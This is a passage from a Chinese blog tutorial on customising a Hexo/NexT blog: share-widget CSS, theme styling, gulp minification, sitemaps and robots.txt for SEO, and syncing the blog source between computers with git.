!important; &#125; .-mob-share-weixin-qrcode-close &#123; background-image: url('/lib/fancybox/source/fancybox_sprite.png') !important;//因为兼容问题把vendor改成了lib，根据自己的路径修改 &#125; .-mob-share-weixin-qrcode-close &#123; overflow: hidden; line-height: 100px !important; position: absolute !important; top: -18px !important; right: -18px !important; width: 36px !important; height: 36px !important; cursor: pointer !important; z-index: 8040 !important; &#125; /*Retina graphics!*/ @media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (min-device-pixel-ratio: 1.5)&#123; .-mob-share-weixin-qrcode-close &#123; background-image: url('/lib/fancybox/source/fancybox_sprite@2x.png') !important;//因为兼容问题把vendor改成了lib，根据自己的路径修改 background-size: 44px 152px !important; /*The size of the normal image, half the size of the hi-res image*/ &#125; &#125; .-mob-share-close&#123; height: 4em !important; font-size: 0.8em !important; line-height: 4em !important; background: #555 !important; color: #fff !important; &#125; Step6、同一目录下的 third-party.styl 中添加：1@import "mob_share"; Step7、在next/layout/_scripts/third-party/里添加脚本文件mob_share.swig：12345678&#123;% if theme.mob_share.enable %&#125; &lt;script type="text/javascript"&gt; //微信二维码点击背景关闭 $('body').delegate('.-mob-share-weixin-qrcode-bg','click', function()&#123; $(".-mob-share-weixin-qrcode-close").trigger("click"); &#125;); &lt;/script&gt; &#123;% endif %&#125; Step8、在next/layout/_layout.swig的body标签结束前添加：1&#123;% include '_scripts/third-party/mob_share.swig' %&#125; 修改文章页宽 打开themes/next/source/css/_variables/base.styl，找到以下字段并修改为合适的宽度：1$content-desktop-large = 1000px 修改小型代码块颜色 修改\themes\next\source\css\ _variables\base.styl文件，加入自定义颜色：123456789$black-deep = #222 $red = #ff2a2a $blue-bright = #87daff $blue = #0684bd $blue-deep = #262a30 $orange = #fc6423 // 下面是我自定义的颜色 $my-code-foreground = #dd0055 // 用``围出的代码块字体颜色 $my-code-background = #eee // 用``围出的代码块背景颜色 修改$code-background和$code-foreground的值：123456// Code &amp; Code Blocks // 用``围出的代码块 // -------------------------------------------------- $code-font-family = $font-family-monospace $code-font-size = 15px $code-background = $my-code-background $code-foreground = $my-code-foreground $code-border-radius = 4px 添加文章结束标记 在themes/next/layout/_macro/post.swig中，在wechat-subscriber.swig之前添加如下代码：1&lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;---------------- The End ----------------&lt;/div&gt; 添加Fork me on GitHub 去网址https://github.com/blog/273-github-ribbons挑选自己喜欢的样式，并复制代码，添加到themes\next\layout\_layout.swig的body标签之内即可记得把里面的url换成自己的! 把侧边栏头像变成圆形，并且鼠标停留在上面发生旋转效果 修改themes\next\source\css\_common\components\sidebar\sidebar-author.styl：1234567891011121314151617181920212223242526272829.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: site-author-image-border-color; /* start*/ border-radius: 50% webkit-transition: 1.4s all; moz-transition: 1.4s all; ms-transition: 1.4s all; transition: 1.4s all; /* end */ &#125; /* start */ .site-author-image:hover &#123; background-color: #55DAE1; webkit-transform: rotate(360deg) scale(1.1); moz-transform: rotate(360deg) scale(1.1); ms-transform: rotate(360deg) scale(1.1); transform: rotate(360deg) scale(1.1); &#125; /* end */ 注：如果图片是扁的，自己换分辨率低的图片 侧栏添加音乐 去往网易云音乐搜索喜欢的音乐，点击生成外链播放器，复制代码直接放到博文末尾即可，height设为0可隐藏播放器，但仍然可以播放音乐，auto设成0可手动播放，默认是1自动播放，可把代码放到themes/next/layout/_custom/sidebar.swig文件里，播放器会显示在站点预览中 footer居中 修改your blog\themes\next\source\css\_schemes\Mist\index.styl文件，将.footer-inner中的text-align: left;修改为text-align: center;即可。 简单的命令 总结一下简单的使用命令1234567hexo init [folder] # 初始化一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站 hexo new [layout] &lt;title&gt; # 新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default\_layout 参数代替。如果标题包含空格的话，请使用引号括起来 hexo version # 查看版本 hexo clean # 清除缓存文件 (db.json) 和已生成的静态文件 (public) hexo g # 等于hexo generate # 生成静态文件 hexo s # 等于hexo server # 本地预览 hexo d # 等于hexo deploy # 部署，可与hexo g合并为 hexo d -g 站点加速使用云盘存放图片资源 由于Github的服务器在海外，那么如果把图片也放到Github显然是不科学的，而且Github的存储空间也有局限，那么在这里博主推荐使用七牛云储存免费用户实名审核之后，新建空间，专门用来放置博客上引用的资源，进入空间后点击「内容管理」，再点击「上传」上传完成之后点击关闭回到管理页面，选中刚上传的图片，最右边的操作点击复制链接即可然后在博文中通过地址引用1![](图片地址如:http://ojoba1c98.bkt.clouddn.com/img/build-hexo/copyUrl.png) 压缩代码 安装插件：12$ npm install gulp -g$ npm install gulp-minify-css gulp-uglify gulp-htmlmin gulp-htmlclean gulp --sav 在博客根目录下新建 gulpfile.js ，并填入以下内容：123456789101112131415161718192021222324252627282930313233var gulp = require('gulp');var minifycss = require('gulp-minify-css');var uglify = require('gulp-uglify');var htmlmin = require('gulp-htmlmin');var htmlclean = require('gulp-htmlclean');// 压缩 public 目录 cssgulp.task('minify-css', function() &#123; return gulp.src('./public/**/*.css') .pipe(minifycss()) .pipe(gulp.dest('./public'));&#125;);// 压缩 public 目录 htmlgulp.task('minify-html', function() &#123; return gulp.src('./public/**/*.html') .pipe(htmlclean()) .pipe(htmlmin(&#123; removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, &#125;)) .pipe(gulp.dest('./public'))&#125;);// 压缩 public/js 目录 jsgulp.task('minify-js', function() &#123; return gulp.src('./public/**/*.js') .pipe(uglify()) .pipe(gulp.dest('./public'));&#125;);// 执行 gulp 命令时执行的任务gulp.task('default', [ 'minify-html','minify-css','minify-js']); 生成博文是执行 hexo g &amp;&amp; gulp 就会根据 gulpfile.js 中的配置，对 public 目录中的静态资源文件进行压缩。 SEO(搜索引擎优化)网站验证 以下是几个搜索引擎的提交入口： 百度提交入口 Google提交入口 _360提交入口_ 添加并提交sitemap 安装hexo的sitemap网站地图生成插件:12npm install hexo-generator-sitemap --save npm install hexo-generator-baidu-sitemap --save 在站点配置文件或主题配置文件加入：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1234sitemap: path: sitemap.xml baidusitemap: path: baidusitemap.xml 在hexo-site\source中新建文件robots.txt,内容如下，请自行替换1234567891011121314User-agent: *Allow: / Allow: /archives/ Allow: /categories/ Allow: /tags/ Allow: /about/ Allow: /count/Disallow: /js/ Disallow: /css/ Disallow: /fonts/ Disallow: /vendors/ Sitemap: http://longofo.cc/sitemap.xml Sitemap: http://longofo.cc/baidusitemap.xml Allow后面的就是你的menu 可以在主题配置文件中找到。前往链接：https://www.google.com/webmasters/添加你的网站。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下载验证文件放入hexo-site\source中Tips: 站点配置文件忽略Google的验证文件。这样clean的时候就不会被删除了。123skip_render: - README.md - google*****.html 打开站点地图：添加站点地图。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以进入站点地图详情查看有没有报错。 robots.txt测试 百度搜索资源平台 由于百度的爬虫会被github屏蔽,我在网上找了很多解决方法,最后使用了这个方法解决了 多PC同步源码 1.准备工作：公司电脑和家里电脑配置git ssh密钥连接2.上传blog到git：此项建议先在blog进度最新的PC上进行，否则会有版本冲突，解决也比较麻烦。在PC上建立git ssh密钥连接和建立新库respo在此略过： 编辑.gitignore文件：.gitignore文件作用是声明不被git记录的文件，blog根目录下的.gitignore是hexo初始化是创建的，可以直接编辑，建议.gitignore文件包括以下内容：1234567.DS_Store Thumbs.db db.json *.log node_modules/ public/ .deploy*/ public内的文件可以根据source文件夹内容自动生成的，不需要备份。其他日志、压缩、数据库等文件也都是调试等使用，也不需要备份。 初始化仓库：12git init git remote add origin &lt;server&gt; server是仓库的在线目录地址，可以从git上直接复制过来，origin是本地分支，remote add会将本地仓库映射到托管服务器的仓库上。添加本地文件到仓库并同步到git上：123git add . #添加blog目录下所有文件，注意有个'.'(.gitignore里面声明的文件不在此内) git commit -m "hexo source first add" #添加更新说明 git push -u origin master #推送更新到git上 至此，git库上备份已完成。 3.将git的内容同步到另一台电脑：假设之前将公司电脑中的blog源码内容备份到了git上，现在家里电脑准备同步源码内容。注意，在同步前也要事先建好hexo的环境，不然同步后本地服务器运行时会出现无法运行错误。在建好的环境的主目录运行以下命令：1234git init #将目录添加到版本控制系统中 git remote add origin &lt;server&gt; #同上 git fetch --all #将git上所有文件拉取到本地 git reset --hard origin/master #强制将本地内容指向刚刚同步git云端内容 reset对所拉取的文件不做任何处理，此处不用pull是因为本地尚有许多文件，使用pull会有一些版本冲突，解决起来也麻烦，而本地的文件都是初始化生成的文件，较拉取的库里面的文件而言基本无用，所以直接丢弃。 4.家里电脑生成完文章并部署到服务器上后，此时需要将新的blog源码文件更新到git托管库上，不然公司电脑上无法获取最新的文章。在本地文件中运行以下命令：1git add . #将所有更新的本地文件添加到版本控制系统中 此时可以使用git status查看本地文件的状态。然后对更改添加说明更推送到git托管库上：12git commit -m '更新信息说明' git push 至此，家里电脑更新的备份完成。在公司电脑上使用时，只需先运行:1git pull 获取的源码即为最新文件 最后折腾起来还是挺累的，不过也学到了一些东西，同时还要感谢很多大佬的文章由衷感谢。 参考http://yangbingdong.com/2017/build-blog-hexo-advanced/https://thief.one/2017/03/03/Hexo搭建博客教程/http://mtianyan.gitee.io/post/a625fa82.htmlhttps://zhuanlan.zhihu.com/p/26625249…]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>搭建博客</tag>
      </tags>
  </entry>
</search>
